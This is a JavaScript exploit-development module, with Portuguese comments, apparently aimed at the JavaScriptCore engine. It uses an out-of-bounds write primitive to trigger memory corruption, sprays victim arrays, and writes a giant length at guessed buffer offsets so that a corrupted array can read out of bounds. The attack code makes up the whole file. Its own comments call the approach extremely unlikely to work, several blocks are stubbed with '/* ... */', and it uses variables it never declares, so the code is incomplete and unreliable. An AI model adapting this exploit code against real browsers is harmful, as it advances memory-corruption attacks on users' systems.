// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSpeculativeArrayLength";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const HUGE_ARRAY_LENGTH = 0x7FFFFFFE; // Um valor de length muito grande

class CheckpointForSpeculativeArrayLength {
    constructor(id) {
        this.id_marker = `SpeculativeArrayLengthCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "SpeculativeArrayLength_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            success: false, message: "Getter chamado, tentando corrupção de length de array especulativa.",
            error: null, details: ""
        };
        let details_log = [];
        let corruption_achieved = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute) {
                throw new Error("oob_array_buffer_real ou oob_write_absolute não disponíveis no getter.");
            }

            const spray_count = 100; // Quantidade de arrays no spray
            const original_array_element_count = 4;
            let victim_arrays_sprayed = [];

            logS3("DENTRO DO GETTER: Pulverizando arrays vítima...", "info", FNAME_GETTER);
            for (let i = 0; i < spray_count; i++) {
                let arr = new Array(original_array_element_count);
                for(let j=0; j<original_array_element_count; j++) arr[j] = 0x42000000 + i + j;
                victim_arrays_sprayed.push(arr);
            }
            details_log.push(`Spray de ${victim_arrays_sprayed.length} arrays (tamanho ${original_array_element_count}) concluído.`);

            // Tentar sobrescrever um campo de 'length' especulativo DENTRO do oob_array_buffer_real.
            // Esta é a parte mais especulativa: assumimos que um dos victim_arrays_sprayed
            // (ou seus metadados de length) foi alocado em um offset conhecido DENTRO do oob_array_buffer_real.
            // Isso é EXTREMAMENTE improvável devido ao Gigacage e como os objetos JS são alocados.
            // Este teste é mais para esgotar a ideia de usar oob_write_absolute diretamente para isso.
            
            // Vamos escolher alguns offsets dentro do oob_array_buffer_real para tentar a sorte.
            // Estes offsets são arbitrários e não baseados em leaks.
            const speculative_length_offsets_in_oob_ab = [0x400, 0x600, 0x800, 0xA00, 0xC00, 0xE00]; 
            // O campo length de um Array é tipicamente um Uint32.

            for (const speculative_offset of speculative_length_offsets_in_oob_ab) {
                if (speculative_offset + 4 <= oob_array_buffer_real.byteLength) {
                    logS3(`DENTRO DO GETTER: Tentando escrever length gigante (${toHex(HUGE_ARRAY_LENGTH)}) em oob_data[${toHex(speculative_offset)}]...`, "info", FNAME_GETTER);
                    try {
                        oob_write_absolute(speculative_offset, HUGE_ARRAY_LENGTH, 4); // Escreve como Uint32
                        details_log.push(`Escrita de length gigante em ${toHex(speculative_offset)}.`);
                    } catch (e_write) {
                        details_log.push(`Erro ao escrever length em ${toHex(speculative_offset)}: ${e_write.message}`);
                    }
                }
            }

            // Verificar todos os arrays pulverizados por um length corrompido
            logS3("DENTRO DO GETTER: Verificando arrays pulverizados por length corrompido...", "info", FNAME_GETTER);
            for (let i = 0; i < victim_arrays_sprayed.length; i++) {
                const arr_check = victim_arrays_sprayed[i];
                if (!arr_check) continue;
                const current_len = arr_check.length;

                if (current_len === HUGE_ARRAY_LENGTH) {
                    details_log.push(`SUCESSO! victim_arrays_sprayed[${i}].length é ${current_len} (GIGANTE!)`);
                    logS3(details_log[details_log.length-1], "vuln", FNAME_GETTER);
                    current_test_results.success = true;
                    current_test_results.message = `Array[${i}] teve seu length corrompido para ${toHex(current_len)}!`;
                    
                    // Tentar uma leitura OOB simples
                    try {
                        const oob_val = arr_check[original_array_element_count + 10]; // Ler um pouco além
                        details_log.push(`  Leitura OOB de arr[${original_array_element_count + 10}] = ${String(oob_val)}`);
                         logS3(`  Leitura OOB de arr[${original_array_element_count + 10}] = ${String(oob_val)}`, "leak", FNAME_GETTER);
                    } catch (e_oob_arr_read) {
                        details_log.push(`  Erro na leitura OOB do array: ${e_oob_arr_read.message}`);
                    }
                    corruption_achieved = true;
                    break; 
                } else if (current_len !== original_array_element_count && i < 10) { // Logar se diferente, mas não o GIGANTE
                     details_log.push(`victim_arrays_sprayed[${i}].length: ${current_len} (inesperado, mas não o gigante)`);
                }
            }

            if (!corruption_achieved) {
                current_test_results.message = "Nenhuma corrupção de length de Array para o valor gigante foi detectada.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForSpeculativeArrayLength.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_spec_arr_len_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST_RUNNER = "executeSpeculativeArrayLengthTestRunner";
    logS3(`--- Iniciando Teste Especulativo de Corrupção de Array.length ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        // Criar o objeto Checkpoint. O array vítima será criado ANTES da escrita OOB gatilho
        // para aumentar a chance (ainda que mínima) de estar adjacente a algo afetado.
        // No entanto, o teste principal de corrupção de length ocorre no getter em arrays NOVOS.
        // Para este teste, vamos criar o array vítima globalmente e acessá-lo no getter.
        array_victim_for_length_test = new Array(VICTIM_ARRAY_ORIGINAL_LENGTH); // Referência global
        for(let i=0; i< VICTIM_ARRAY_ORIGINAL_LENGTH; i++) array_victim_for_length_test[i] = 0x41410000 + i;
        logS3(`Array vítima global para teste de length criado (length ${array_victim_for_length_test.length}).`, "info", FNAME_TEST_RUNNER);


        const checkpoint_obj = new CheckpointForSpeculativeArrayLength(1);
        logS3(`CheckpointForSpeculativeArrayLength objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE CORRUPÇÃO ARRAY.LENGTH: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE CORRUPÇÃO ARRAY.LENGTH: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
         if (current_test_results.error) {
            logS3(`  Erro reportado no getter: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
        }
    } else {
        logS3("RESULTADO TESTE CORRUPÇÃO ARRAY.LENGTH: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    array_victim_for_length_test = null; // Limpar
    logS3(`--- Teste Especulativo de Corrupção de Array.length Concluído ---`, "test", FNAME_TEST_RUNNER);
}
